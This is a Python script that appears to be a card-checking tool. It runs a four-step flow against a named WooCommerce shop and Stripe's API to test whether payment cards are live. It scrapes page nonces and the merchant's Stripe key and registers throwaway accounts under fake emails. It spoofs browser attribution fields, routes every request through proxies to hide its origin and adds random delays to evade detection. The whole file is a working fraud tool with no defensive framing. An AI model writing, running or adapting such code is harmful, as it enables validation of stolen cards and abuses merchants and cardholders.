# mentos_flow.py
# Core four-request card flow. Framework-agnostic.
# Proxy is optional and threaded through every request when provided.

import os
import re
import time
import random
import datetime
import requests
from typing import Dict, Any, Optional
from faker import Faker

faker = Faker()

# ── Config via env ────────────────────────────────────────────────
BASE_URL = os.getenv("MENTOS_BASE_URL", "https://dilaboards.com")
USER_AGENT = os.getenv(
    "MENTOS_USER_AGENT",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
)
TIMEOUT = int(os.getenv("MENTOS_TIMEOUT", "30"))
JITTER = (float(os.getenv("MENTOS_JITTER_MIN", "1.0")),
          float(os.getenv("MENTOS_JITTER_MAX", "3.0")))


# ── Proxy parsing ─────────────────────────────────────────────────
def parse_proxy(raw: Optional[str]) -> Optional[Dict[str, str]]:
    """
    Accepts any of:
      ip:port
      ip:port:user:pass
      user:pass:ip:port
      user:pass@ip:port
      http://user:pass@ip:port
      socks5://user:pass@ip:port
    Returns a requests-compatible {"http": url, "https": url} dict,
    or None if raw is empty.
    """
    if not raw:
        return None
    s = raw.strip()
    if not s:
        return None

    # already scheme'd
    if "://" in s:
        url = s
    elif "@" in s:
        url = "http://" + s
    else:
        parts = s.split(":")
        if len(parts) == 2:
            # ip:port
            url = f"http://{parts[0]}:{parts[1]}"
        elif len(parts) == 4:
            p0, p1, p2, p3 = parts
            # detect which pair is host:port by looking for a dot
            if "." in p0:
                # host:port:user:pass
                url = f"http://{p2}:{p3}@{p0}:{p1}"
            elif "." in p2:
                # user:pass:host:port
                url = f"http://{p0}:{p1}@{p2}:{p3}"
            else:
                # assume host:port:user:pass
                url = f"http://{p2}:{p3}@{p0}:{p1}"
        else:
            # unknown — pass through with http scheme
            url = "http://" + s

    return {"http": url, "https": url}


# ── HTTP wrapper ──────────────────────────────────────────────────
def _request(
    session: requests.Session,
    method: str,
    url: str,
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    proxies: Optional[Dict[str, str]] = None,
    max_retries: int = 3,
) -> requests.Response:
    """4xx returned as-is; 5xx and network errors retried.
    Every call rides the same proxy when provided."""
    clean = {k: v for k, v in (headers or {}).items() if k.lower() != "cookie"}
    kwargs = {
        "headers": clean,
        "data": data or None,
        "params": params or None,
        "cookies": {},
        "timeout": TIMEOUT,
    }
    if proxies:
        kwargs["proxies"] = proxies
    kwargs = {k: v for k, v in kwargs.items() if v is not None}

    last = None
    for attempt in range(1, max_retries + 1):
        try:
            r = session.request(method, url, **kwargs)
            if r.status_code >= 500:
                raise requests.HTTPError(f"server {r.status_code}")
            return r
        except (requests.ConnectionError, requests.Timeout, requests.HTTPError) as e:
            last = e
            if attempt < max_retries:
                time.sleep(1.5 * attempt)
    raise last


# ── Response parsing ──────────────────────────────────────────────
def _extract_message(response: requests.Response) -> str:
    """Dig out the most relevant error message from a Stripe/WC response."""
    try:
        body = response.json()
    except (ValueError, Exception):
        m = re.search(r'"message"\s*:\s*"(.*?)"', response.text)
        return m.group(1) if m else response.text[:200]

    if not isinstance(body, dict):
        return str(body)[:200]

    # WC step-4 shape: {"success": false, "data": {"error": {"message": "..."}}}
    if isinstance(body.get("data"), dict):
        d = body["data"]
        if isinstance(d.get("error"), dict) and d["error"].get("message"):
            return d["error"]["message"]
        if d.get("message"):
            return d["message"]

    # Stripe top-level: {"error": {"message": "..."}}
    if isinstance(body.get("error"), dict) and body["error"].get("message"):
        return body["error"]["message"]

    if body.get("message"):
        return body["message"]

    return f"No message field. Body: {str(body)[:300]}"


def _classify_final(response: requests.Response) -> tuple[str, str]:
    """Return (status, message) from the wc-ajax setup-intent response."""
    msg = _extract_message(response)
    try:
        body = response.json()
    except (ValueError, Exception):
        return "error", msg

    if isinstance(body, dict) and body.get("success") is True:
        return "approved", msg
    return "declined", msg


# ── Core flow ─────────────────────────────────────────────────────
def check_card(
    card_number: str,
    exp_month: str,
    exp_year: str,
    cvv: str,
    proxy: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Run the four-step flow, optionally through a proxy.
    Proxy is used for all four requests (site + Stripe) so we never
    leak the origin IP across steps.
    """
    t0 = time.time()
    card_number = re.sub(r"\D", "", card_number)
    cvv = re.sub(r"\D", "", cvv)
    exp_month = exp_month.zfill(2)
    exp_year = exp_year[-2:].zfill(2)

    proxies = parse_proxy(proxy)

    def _result(status: str, message: str, step: int) -> Dict[str, Any]:
        return {
            "status": status,
            "message": message,
            "card": {
                "bin": card_number[:6] if len(card_number) >= 6 else card_number,
                "last4": card_number[-4:] if len(card_number) >= 4 else card_number,
            },
            "step": step,
            "duration_ms": int((time.time() - t0) * 1000),
        }

    session = requests.Session()

    # ── Step 1: GET page, scrape nonce + pk ──────────────────────
    url_1 = f"{BASE_URL}/en/moj-racun/add-payment-method/"
    headers_1 = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    try:
        r1 = _request(session, "GET", url_1, headers=headers_1, proxies=proxies)
    except Exception as e:
        return _result("error", f"step1 network: {e}", 1)

    nonce_match = re.findall(r'name="woocommerce-register-nonce"\s+value="(.*?)"', r1.text)
    pk_match = re.findall(r'"key"\s*:\s*"(pk_[^"]+)"', r1.text)
    if not nonce_match or not pk_match:
        return _result("error", "step1 parse: nonce or pk missing", 1)
    register_nonce, pk = nonce_match[0], pk_match[0]

    time.sleep(random.uniform(*JITTER))

    # ── Step 2: register throwaway account ───────────────────────
    email = faker.email(domain="gmail.com")
    headers_2 = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": BASE_URL,
        "Referer": url_1,
        "Upgrade-Insecure-Requests": "1",
    }
    data_2 = {
        "email": email,
        "wc_order_attribution_source_type": "typein",
        "wc_order_attribution_referrer": "(none)",
        "wc_order_attribution_utm_campaign": "(none)",
        "wc_order_attribution_utm_source": "(direct)",
        "wc_order_attribution_utm_medium": "(none)",
        "wc_order_attribution_utm_content": "(none)",
        "wc_order_attribution_utm_id": "(none)",
        "wc_order_attribution_utm_term": "(none)",
        "wc_order_attribution_utm_source_platform": "(none)",
        "wc_order_attribution_utm_creative_format": "(none)",
        "wc_order_attribution_utm_marketing_tactic": "(none)",
        "wc_order_attribution_session_entry": url_1,
        "wc_order_attribution_session_start_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "wc_order_attribution_session_pages": "2",
        "wc_order_attribution_session_count": "1",
        "wc_order_attribution_user_agent": USER_AGENT,
        "woocommerce-register-nonce": register_nonce,
        "_wp_http_referer": "/en/moj-racun/add-payment-method/",
        "register": "Register",
    }
    try:
        r2 = _request(session, "POST", url_1, headers=headers_2, data=data_2, proxies=proxies)
    except Exception as e:
        return _result("error", f"step2 network: {e}", 2)

    ajax_match = re.findall(r'"createAndConfirmSetupIntentNonce"\s*:\s*"(.*?)"', r2.text)
    if not ajax_match:
        return _result("error", "step2 parse: ajax nonce missing", 2)
    ajax_nonce = ajax_match[0]

    time.sleep(random.uniform(*JITTER))

    # ── Step 3: submit card to Stripe ────────────────────────────
    headers_3 = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json",
        "Referer": "https://js.stripe.com/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
    }
    data_3 = {
        "type": "card",
        "card[number]": card_number,
        "card[cvc]": cvv,
        "card[exp_year]": exp_year,
        "card[exp_month]": exp_month,
        "allow_redisplay": "unspecified",
        "billing_details[address][postal_code]": "11081",
        "billing_details[address][country]": "US",
        "payment_user_agent": "stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent",
        "referrer": BASE_URL,
        "time_on_page": str(random.randint(100000, 999999)),
        "client_attribution_metadata[client_session_id]": "src_api_hosted",
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
        "client_attribution_metadata[elements_session_config_id]": "src_api_hosted",
        "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
        "guid": "guid_api_hosted",
        "muid": "muid_api_hosted",
        "sid": "sid_api_hosted",
        "key": pk,
        "_stripe_version": "2024-06-20",
    }
    try:
        r3 = _request(session, "POST", "https://api.stripe.com/v1/payment_methods",
                      headers=headers_3, data=data_3, proxies=proxies)
    except Exception as e:
        return _result("error", f"step3 network: {e}", 3)

    if r3.status_code != 200:
        return _result("declined", _extract_message(r3), 3)
    try:
        pm = r3.json()["id"]
    except (KeyError, ValueError):
        return _result("error", f"step3 parse: {r3.text[:200]}", 3)

    time.sleep(random.uniform(*JITTER))

    # ── Step 4: confirm setup intent via wc-ajax ─────────────────
    headers_4 = {
        "User-Agent": USER_AGENT,
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": BASE_URL,
        "Referer": url_1,
    }
    params_4 = {
        "wc-ajax": "wc_stripe_create_and_confirm_setup_intent",
    }
    data_4 = {
        "action": "create_and_confirm_setup_intent",
        "wc-stripe-payment-method": pm,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": ajax_nonce,
    }
    try:
        r4 = _request(session, "POST", f"{BASE_URL}/en/",
                      headers=headers_4, params=params_4, data=data_4, proxies=proxies)
    except Exception as e:
        return _result("error", f"step4 network: {e}", 4)

    status, msg = _classify_final(r4)
    return _result(status, msg, 4)
